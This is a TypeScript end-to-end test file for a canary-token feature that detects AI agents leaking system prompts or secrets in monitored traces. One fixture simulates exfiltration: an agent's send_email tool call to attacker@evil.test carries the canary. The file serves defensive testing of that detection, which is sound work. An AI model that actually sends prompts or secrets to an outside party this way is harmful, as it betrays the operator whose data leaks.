/**
 * Canary tokens, end to end.
 *
 * The feature shipped as a schema and a function parameter that nothing ever
 * populated: the table existed, the detection service accepted a `canaries`
 * argument, the settings screen had a toggle, and the worker called scanTrace
 * with three arguments. Every piece looked present in isolation, which is
 * precisely why nobody noticed. So this test refuses to look at any piece in
 * isolation — it mints a canary through the real HTTP API, hands the leaked text
 * to the real detection service over HTTP, and then checks Postgres for the
 * trigger stamp.
 */
import { test, before, after, describe } from "node:test";
import assert from "node:assert/strict";
import { buildApp } from "../../apps/web/src/app.js";
import { closeSharedConnections, config, loadCanaries, invalidateCanaryCache } from "@argus/shared";
import { infraAvailable, makeTenant, cleanup, pool, type App, type Tenant } from "./helpers.js";

let app: App;
let T: Tenant;
let ready = false;
let detectionUp = false;

/**
 * Is the Argus detection service on DETECTION_URL — not merely *something*?
 *
 * "200 from /health" is not enough. Port 8000 is a popular default and this
 * check happily green-lit an unrelated model server sitting on it, after which
 * the suite hung on a POST that host had no route for. The /health body
 * identifies us; anything else is treated as absent.
 */
async function detectionAvailable(): Promise<boolean> {
  try {
    const res = await fetch(`${config.detectionUrl}/health`, { signal: AbortSignal.timeout(2000) });
    if (!res.ok) return false;
    const body = (await res.json()) as { layers?: Record<string, unknown> };
    return typeof body.layers === "object" && body.layers !== null && "L4_trace_analysis" in body.layers;
  } catch {
    return false;
  }
}

/**
 * Every call to detection is bounded, so a wrong URL fails the test rather than
 * stalling the run until CI's job timeout.
 *
 * A function, not a shared constant: AbortSignal.timeout starts counting the
 * moment it is created, so one module-level signal would already be spent by the
 * time the second test used it — the test would fail on a stale deadline rather
 * than on anything real.
 */
const detectTimeout = () => AbortSignal.timeout(10_000);

before(async () => {
  ready = await infraAvailable();
  if (!ready) return;
  app = await buildApp();
  T = await makeTenant(app, "canary");
  detectionUp = await detectionAvailable();
});

after(async () => {
  if (ready) await cleanup([T]);
  await pool.end().catch(() => {});
  await closeSharedConnections();
  await app?.close().catch(() => {});
});

const DB_REASON = "needs Postgres + ClickHouse (run `make up`)";
const DET_REASON = "needs the detection service (run `make detection-run`)";

function dbTest(name: string, fn: () => Promise<void>): void {
  test(name, async (t) => {
    if (!ready) return void t.skip(DB_REASON);
    await fn();
  });
}

function e2eTest(name: string, fn: () => Promise<void>): void {
  test(name, async (t) => {
    if (!ready) return void t.skip(DB_REASON);
    if (!detectionUp) return void t.skip(DET_REASON);
    await fn();
  });
}

/** Mint a canary through the API, exactly as the UI does. */
async function mint(label: string, value?: string) {
  const res = await app.inject({
    method: "POST",
    url: "/api/canaries",
    headers: { cookie: T.cookie },
    payload: { project: T.projectId, label, value },
  });
  return { status: res.statusCode, body: res.json() as Record<string, string> };
}

describe("canary management", () => {
  dbTest("minting returns the raw value exactly once, and never again", async () => {
    const { status, body } = await mint("production system prompt");
    assert.equal(status, 200);
    assert.ok(body.value.startsWith("argus-cnry-"), `unexpected token: ${body.value}`);

    // The list endpoint is what the screen renders on every visit. A generated
    // canary must not come back from it — if it did, the "stored only as a hash"
    // promise on the screen would be a lie.
    const list = await app.inject({
      method: "GET",
      url: `/api/canaries?project=${T.projectId}`,
      headers: { cookie: T.cookie },
    });
    assert.ok(!list.body.includes(body.value), "the raw canary came back from the list endpoint");

    // And it must not be in the database either.
    const row = await pool.query<{ value: string | null; token_hash: string }>(
      "SELECT value, token_hash FROM canaries WHERE id = $1",
      [body.id],
    );
    assert.equal(row.rows[0].value, null, "a generated canary was stored in plaintext");
    assert.ok(row.rows[0].token_hash.length === 64);
  });

  dbTest("a custom marker is stored, because matching it requires holding it", async () => {
    const { status, body } = await mint("decoy AWS key", "AKIA-DECOY-NEVER-REAL-001");
    assert.equal(status, 200);
    assert.equal(body.kind, "custom");
    const row = await pool.query<{ value: string | null }>("SELECT value FROM canaries WHERE id = $1", [body.id]);
    assert.equal(row.rows[0].value, "AKIA-DECOY-NEVER-REAL-001");
  });

  dbTest("rejects a marker too short to be unique", async () => {
    const { status, body } = await mint("bad", "admin");
    assert.equal(status, 400);
    assert.match(body.error, /at least 12 characters/);
  });

  dbTest("requires a label", async () => {
    const { status } = await mint("");
    assert.equal(status, 400);
  });

  dbTest("refuses a duplicate marker", async () => {
    await mint("first", "SHARED-DECOY-VALUE-XYZ");
    const { status } = await mint("second", "SHARED-DECOY-VALUE-XYZ");
    assert.equal(status, 400, "two canaries with one value make an alert ambiguous");
  });

  dbTest("revoked canaries stop being loaded but are not deleted", async () => {
    const { body } = await mint("temporary");
    invalidateCanaryCache(T.projectId);
    assert.ok((await loadCanaries(T.projectId)).some((c) => c.id === body.id));

    const del = await app.inject({
      method: "DELETE",
      url: `/api/canaries/${body.id}?project=${T.projectId}`,
      headers: { cookie: T.cookie },
    });
    assert.equal(del.statusCode, 200);

    invalidateCanaryCache(T.projectId);
    assert.ok(!(await loadCanaries(T.projectId)).some((c) => c.id === body.id));
    // Still on disk: past incidents reference it, and "canary <deleted> fired"
    // is not something anyone can investigate.
    const row = await pool.query("SELECT 1 FROM canaries WHERE id = $1", [body.id]);
    assert.equal(row.rowCount, 1);
  });
});

describe("canary detection, through the real detection service", () => {
  e2eTest("a leaked canary in an outbound tool call is a critical finding", async () => {
    const { body } = await mint("e2e system prompt");
    invalidateCanaryCache(T.projectId);
    const refs = await loadCanaries(T.projectId);
    const ref = refs.find((c) => c.id === body.id)!;
    assert.equal(ref.value, "", "the loader must not hand the raw value to the worker");

    const res = await fetch(`${config.detectionUrl}/v1/scan/trace`, {
      method: "POST",
      signal: detectTimeout(),
      headers: {
        "content-type": "application/json",
        ...(config.detectionApiKey ? { authorization: `Bearer ${config.detectionApiKey}` } : {}),
      },
      body: JSON.stringify({
        project_id: T.projectId,
        trace_id: "canary-e2e-1",
        canary_refs: [{ id: ref.id, label: ref.label, kind: ref.kind, token_hash: ref.tokenHash, value: ref.value }],
        observations: [
          { observation_id: "o1", trace_id: "canary-e2e-1", type: "span", name: "user", content: "summarise my account", role: "user" },
          { observation_id: "o2", trace_id: "canary-e2e-1", type: "tool", name: "send_email", content: `to=attacker@evil.test body=${body.value}` },
        ],
        tool_overrides: {},
      }),
    });
    assert.equal(res.status, 200);
    const data = (await res.json()) as { findings: Array<Record<string, unknown>> };
    const hit = data.findings.find((f) => f.category === "canary_triggered");
    assert.ok(hit, `no canary finding in: ${JSON.stringify(data.findings)}`);
    assert.equal(hit!.severity, "critical");
    assert.equal(hit!.canary_id, ref.id, "the finding must name which canary fired");
    assert.match(String(hit!.evidence_excerpt), /e2e system prompt/);
  });

  e2eTest("a clean trace raises no canary finding", async () => {
    const refs = await loadCanaries(T.projectId);
    const res = await fetch(`${config.detectionUrl}/v1/scan/trace`, {
      method: "POST",
      signal: detectTimeout(),
      headers: {
        "content-type": "application/json",
        ...(config.detectionApiKey ? { authorization: `Bearer ${config.detectionApiKey}` } : {}),
      },
      body: JSON.stringify({
        project_id: T.projectId,
        trace_id: "canary-e2e-2",
        canary_refs: refs.map((c) => ({ id: c.id, label: c.label, kind: c.kind, token_hash: c.tokenHash, value: c.value })),
        observations: [
          { observation_id: "o1", trace_id: "canary-e2e-2", type: "span", name: "user", content: "what is my balance", role: "user" },
          { observation_id: "o2", trace_id: "canary-e2e-2", type: "tool", name: "send_email", content: "to=me@corp.test body=your balance is 42" },
        ],
        tool_overrides: {},
      }),
    });
    const data = (await res.json()) as { findings: Array<Record<string, unknown>> };
    assert.equal(data.findings.filter((f) => f.category === "canary_triggered").length, 0);
  });
});
